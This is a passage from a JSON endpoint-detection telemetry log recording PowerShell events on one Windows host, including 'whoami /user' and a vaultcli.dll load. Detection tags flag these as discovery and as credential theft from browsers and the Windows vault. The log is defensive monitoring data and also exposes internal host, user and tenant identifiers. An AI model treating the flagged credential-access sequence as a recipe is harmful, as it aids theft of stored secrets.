            "uniqueRuleId": 19114,
            "version": "3.0"
        },
        {
            "contextTraceId": "23500fac-64fd-41c3-a384-08c6073f1290",
            "detectionDate": "2024-08-01T15:54:28Z",
            "dtsId": "EDR",
            "dtsType": "all",
            "eventType": "File Moved",
            "fileAttributes": {
                "creationDate": "2024-08-01T15:48:27.822Z",
                "fsattrs": 32,
                "lastModificationDate": "2024-08-01T15:54:01.853Z",
                "md5": "BC21B6F865A3BBACCDBC37ED0D44DED3",
                "name": "0H8N2X9KA7RPIART73T2.temp",
                "newFilePath": "C:\\Users\\cdaauto\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\CustomDestinations\\590aee7bdd69b59b.customDestinations-ms",
                "path": "C:\\Users\\cdaauto\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\CustomDestinations\\0H8N2X9KA7RPIART73T2.temp",
                "sha1": "735CC586A89B6BEC2B1AFF57565B729E1E3EF302",
                "sha256": "07A0F08BFB92F4676BD2673AE6AB147B54E5C05A5A59C43AF58EF1FADE46E1B2",
                "size": 6229
            },
            "h_os": "windows",
            "h_tp": "mar_4.2.1.4528",
            "h_traceType": "all",
            "h_version": "3.0",
            "host": "479W1022H264",
            "it": 1,
            "maGuid": "EB44566A-4F0B-11EF-370F-005056A41D84",
            "pFullName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "pSha2": "9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3",
            "parentTraceId": "5376d470-026b-4f4e-8199-e764dbd64451",
            "pid": 9936,
            "ppid": 9936,
            "rv": 4528,
            "tags": [
                "@AC.NonPECreated"
            ],
            "tenantId": "1E23A611-B47C-463A-A66E-B46D27E46001",
            "time": "2024-08-01T15:54:01.875Z",
            "traceId": "611180aa-4229-4c34-9e6d-c11ffc6d6577",
            "uniqueRuleId": 21,
            "version": "3.0"
        },
        {
            "contextTraceId": "23500fac-64fd-41c3-a384-08c6073f1290",
            "detectionDate": "2024-08-01T15:54:28Z",
            "dtsId": "EDR",
            "dtsType": "all",
            "eventType": "File Deleted",
            "fileAttributes": {
                "creationDate": "2024-08-01T15:54:01.962Z",
                "fsattrs": 32,
                "lastModificationDate": "2024-08-01T15:54:01.962Z",
                "md5": "D17FE0A3F47BE24A6453E9EF58C94641",
                "mhdr": "2320506f77657253",
                "name": "__PSScriptPolicyTest_fift2gbs.szm.ps1",
                "path": "C:\\Users\\cdaauto\\AppData\\Local\\Temp\\__PSScriptPolicyTest_fift2gbs.szm.ps1",
                "sha1": "6AB83620379FC69F80C0242105DDFFD7D98D5D9D",
                "sha256": "96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7",
                "size": 60
            },
            "h_os": "windows",
            "h_tp": "mar_4.2.1.4528",
            "h_traceType": "all",
            "h_version": "3.0",
            "host": "479W1022H264",
            "it": 1,
            "maGuid": "EB44566A-4F0B-11EF-370F-005056A41D84",
            "pFullName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "pSha2": "9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3",
            "parentTraceId": "5376d470-026b-4f4e-8199-e764dbd64451",
            "pid": 9936,
            "ppid": 9936,
            "rv": 4528,
            "tags": [
                "@AC.ScriptCreated"
            ],
            "tenantId": "1E23A611-B47C-463A-A66E-B46D27E46001",
            "time": "2024-08-01T15:54:01.991Z",
            "traceId": "11144f06-3d6d-46ab-b2c4-f21ed473ef68",
            "uniqueRuleId": 6,
            "version": "3.0",
            "action": "",
            "productId": "",
            "description": ""
        },
        {
            "contextTraceId": "23500fac-64fd-41c3-a384-08c6073f1290",
            "detectionDate": "2024-08-01T15:54:28Z",
            "dns": {
                "name": "proxy.ess.gslb.entsec.com",
                "type": 1
            },
            "dtsId": "EDR",
            "dtsType": "all",
            "eventType": "DNS Query",
            "h_os": "windows",
            "h_tp": "mar_4.2.1.4528",
            "h_traceType": "all",
            "h_version": "3.0",
            "host": "479W1022H264",
            "it": 1,
            "maGuid": "EB44566A-4F0B-11EF-370F-005056A41D84",
            "pFullName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "pSha2": "9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3",
            "parentTraceId": "5376d470-026b-4f4e-8199-e764dbd64451",
            "pid": 9936,
            "ppid": 9936,
            "rv": 4528,
            "tags": [
                "@AC.DNSQuery"
            ],
            "tenantId": "1E23A611-B47C-463A-A66E-B46D27E46001",
            "time": "2024-08-01T15:54:09.462Z",
            "traceId": "a0cee309-4103-4d08-9a35-1a76d1c7ccda",
            "uniqueRuleId": 19112,
            "version": "3.0",
            "action": "",
            "productId": "",
            "description": ""
        },
        {
            "contextTraceId": "23500fac-64fd-41c3-a384-08c6073f1290",
            "detectionDate": "2024-08-01T15:54:28Z",
            "dtsId": "EDR",
            "dtsType": "all",
            "eventType": "Image Loaded",
            "h_os": "windows",
            "h_tp": "mar_4.2.1.4528",
            "h_traceType": "all",
            "h_version": "3.0",
            "host": "479W1022H264",
            "it": 1,
            "maGuid": "EB44566A-4F0B-11EF-370F-005056A41D84",
            "modules": [
                {
                    "fsattrs": 32,
                    "loadTime": "2024-08-01T15:54:16.035Z",
                    "name": "C:\\Windows\\System32\\vaultcli.dll",
                    "sha256": "210551B7C96B177AE43D918D31407FF650C1DBB8045BCE3457341E97E130F68C",
                    "vtpPrivileges": 1
                }
            ],
            "pFullName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "pSha2": "9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3",
            "parentTraceId": "5376d470-026b-4f4e-8199-e764dbd64451",
            "pid": 9936,
            "ppid": 9936,
            "rv": 4528,
            "tags": [
                "@AC.LoadedDLLs"
            ],
            "tenantId": "1E23A611-B47C-463A-A66E-B46D27E46001",
            "time": "2024-08-01T15:54:16.035Z",
            "traceId": "30194eab-3791-4de1-a5df-1bd72a1db158",
            "uniqueRuleId": 33,
            "version": "3.0",
            "severity": "s0",
            "detectionsSets": [
                {
                    "sev": "s0",
                    "tags": [
                        "@ATA.CredentialAccess",
                        "@ATE.T1552.001",
                        "@ATE.T1555.003",
                        "@ATE.T1555.004",
                        "@MSI._process_creds_edge"
                    ]
                }
            ]
        },
        {
            "cmdLine": "\"C:\\Windows\\system32\\whoami.exe\" /user",
            "contextTraceId": "23500fac-64fd-41c3-a384-08c6073f1290",
            "detectionDate": "2024-08-01T15:54:28Z",
            "dtsId": "EDR",
            "dtsType": "all",
            "eventType": "Process Created",
            "h_os": "windows",
            "h_tp": "mar_4.2.1.4528",
            "h_traceType": "all",
            "h_version": "3.0",
            "host": "479W1022H264",
            "integrity": 3,
            "it": 1,
            "maGuid": "EB44566A-4F0B-11EF-370F-005056A41D84",
            "pFullName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "pSha2": "1D4902A04D99E8CCBFE7085E63155955FEE397449D386453F6C452AE407B8743",
            "parentTraceId": "5376d470-026b-4f4e-8199-e764dbd64451",
            "parentsTraceId": [
                "5376d470-026b-4f4e-8199-e764dbd64451",
                "ac6ec9e0-ef1f-4e0f-a02c-322be750c2b5"
            ],
            "pid": 9212,
            "ppid": 9936,
            "procFileAttrs": {
                "creationDate": "2019-12-07T09:09:51.678Z",
                "embedFileVersion": "10.0.19041.1 (WinBuild.160101.0800)",
                "embedFilename": "whoami.exe",
                "embedProductName": "Microsoft® Windows® Operating System",
                "embedProductVersion": "10.0.19041.1",
                "embedVendorName": "Microsoft Corporation",
                "md5": "A4A6924F3EAF97981323703D38FD99C4",
                "name": "whoami.exe",
                "path": "C:\\Windows\\System32\\whoami.exe",
                "reputation": {
                    "reputation": 99,
                    "vtpPrivileges": 1
                },
                "sha1": "1915FBFDB73FDD200C47880247ACDDE5442431A9",
                "sha256": "1D4902A04D99E8CCBFE7085E63155955FEE397449D386453F6C452AE407B8743",
                "size": 73728,
                "subsystem": 3
            },
            "processName": "whoami.exe",
            "rv": 4528,
            "tags": [
                "@AC.AdminHackingToolExecuted",
                "@AC.ProcessCreated"
            ],
            "tdmRuleIds": [
                110,
                100000,
                100003,
                100009
            ],
            "tenantId": "1E23A611-B47C-463A-A66E-B46D27E46001",
            "time": "2024-08-01T15:54:09.855Z",
            "traceId": "5c9e9e69-936c-4c2b-b069-ef5eb2ff75ed",
            "user": {
                "domain": "CDA",
                "id": "S-1-5-21-2561662139-2012859153-108931552-1137",
                "name": "cdaauto"
            },
            "version": "3.0",
            "severity": "s0",
            "detectionsSets": [
                {
                    "sev": "s0",
                    "tags": [
                        "@ATA.Discovery",
                        "@ATE.T1033",
                        "@MSI._apt_process_whoami_high"
                    ]
                }
            ],
            "endTime": null,
            "originalSeverity": "s0",
            "processCharacteristics": "",
            "contained": "no",
            "flagged": false,
            "containedBy": "",
            "summary": [
                {
                    "attribute": "cmdline",
                    "attributeKey": "cmdLine",
                    "label": "TRACE_TIMELINE.DETAILS.CMD_LINE",
                    "summarizable": true,
                    "shouldDisplayReadMore": true,
                    "shouldDisplayCopyToClipboard": true
                },
                {
                    "attribute": "domainName",
                    "attributeKey": "user.domain",
                    "label": "TRACE_TIMELINE.DETAILS.DOMAIN_NAME",
                    "summarizable": true
                },
                {
                    "attribute": "user",
                    "attributeKey": "user.name",
                    "label": "TRACE_TIMELINE.DETAILS.USER",
                    "links": [
                        {
                            "label": "TRACE_TIMELINE.DRILL_DOWN_LINKS.PROCESS_USER_ONE",
                            "searchTarget": [
                                "${maGuid}"
                            ],
                            "searchHostname": [
                                "${hostname}"
                            ],
                            "drillDownKey": "PROCESS_USER_ONE",
                            "searchQuery": {
                                "projections": [
                                    {
                                        "name": "Processes",
                                        "outputs": [
                                            "id",
                                            "name",
                                            "cmdline",
                                            "parentid",
                                            "parentname",
                                            "sha1",
                                            "md5",
                                            "user"
                                        ]
                                    }
                                ],
                                "condition": {
                                    "or": [
                                        {
                                            "and": [
                                                {
                                                    "name": "Processes",
                                                    "output": "user",
                                                    "op": "ENDS_WITH",
                                                    "value": "${user}"
                                                }
                                            ]
                                        }
                                    ]
                                }
                            }
                        },
                        {
                            "label": "TRACE_TIMELINE.DRILL_DOWN_LINKS.PROCESS_USER_ALL",
                            "searchQuery": {
                                "projections": [
                                    {
                                        "name": "HostInfo",
                                        "outputs": [
                                            "hostname",
                                            "ip_address"
                                        ]
                                    },
                                    {
                                        "name": "Processes",
                                        "outputs": [
                                            "id",
                                            "name",
                                            "cmdline",
                                            "parentid",
                                            "parentname",
                                            "sha1",
                                            "md5",
                                            "user"
                                        ]
                                    }
                                ],
                                "condition": {
                                    "or": [
                                        {
                                            "and": [
                                                {
                                                    "name": "Processes",
                                                    "output": "user",
                                                    "op": "ENDS_WITH",
                                                    "value": "${user}"
                                                }
                                            ]
                                        }
                                    ]
                                }
                            }
                        },
                        {
                            "label": "TRACE_TIMELINE.DRILL_DOWN_LINKS.LOGGED_USER_ALL",
                            "searchQuery": {
                                "projections": [
                                    {
                                        "name": "HostInfo",
                                        "outputs": [
                                            "hostname",
                                            "ip_address"
                                        ]
                                    },
                                    {
                                        "name": "LoggedInUsers"
                                    }
                                ],
                                "condition": {
                                    "or": [
                                        {
                                            "and": [
                                                {
                                                    "name": "LoggedInUsers",
                                                    "output": "username",
                                                    "op": "EQUALS",
                                                    "value": "${user}"
                                                }
                                            ]
                                        }
                                    ]
                                }
                            }
                        }
                    ],
                    "summarizable": true
                }
            ],
            "pidTraceId": "5c9e9e69-936c-4c2b-b069-ef5eb2ff75ed",
            "lastActivityTime": "2024-08-01T15:54:09.855Z",
            "reputationInfo": {
                "reason": ""
            }
        },
        {
            "contextTraceId": "23500fac-64fd-41c3-a384-08c6073f1290",
            "detectionDate": "2024-08-01T15:54:28Z",
            "dtsId": "EDR",
            "dtsType": "all",
            "eventType": "Image Loaded",
            "h_os": "windows",
            "h_tp": "mar_4.2.1.4528",
            "h_traceType": "all",
            "h_version": "3.0",
            "host": "479W1022H264",
            "it": 1,
            "maGuid": "EB44566A-4F0B-11EF-370F-005056A41D84",
            "modules": [
                {
                    "fsattrs": 32,
                    "loadTime": "2024-08-01T15:54:01.971Z",
                    "name": "C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Management\\fb46ed1c5d8417238617ad3de218cd5a\\System.Management.ni.dll",
                    "sha256": "BB97287BCB9BBF2BB4615D70D68687D5548220A5007D7A648D92A68411A01E7C",
                    "vtpPrivileges": 0
                },
                {
                    "fsattrs": 32,
                    "loadTime": "2024-08-01T15:54:01.973Z",
                    "name": "C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Dired13b18a9#\\e81ddbad69f03d9c6c6304d62078ede5\\System.DirectoryServices.ni.dll",
                    "sha256": "1B0C3521536F0FE29F98F51D2CB27397C6998DBD06A95BF79884C70D446BED0B",
                    "vtpPrivileges": 0
                }
            ],
            "pFullName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "pSha2": "9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3",
            "parentTraceId": "5376d470-026b-4f4e-8199-e764dbd64451",
            "pid": 9936,
            "ppid": 9936,
            "rv": 4528,
            "tags": [
                "@AC.LoadedDLLs"
            ],
            "tenantId": "1E23A611-B47C-463A-A66E-B46D27E46001",
            "time": "2024-08-01T15:54:01.971Z",
            "traceId": "ab44927c-b66a-4e88-800c-3bb7d83a9ab6",
            "uniqueRuleId": 181,
            "version": "3.0"
        }
    ]
}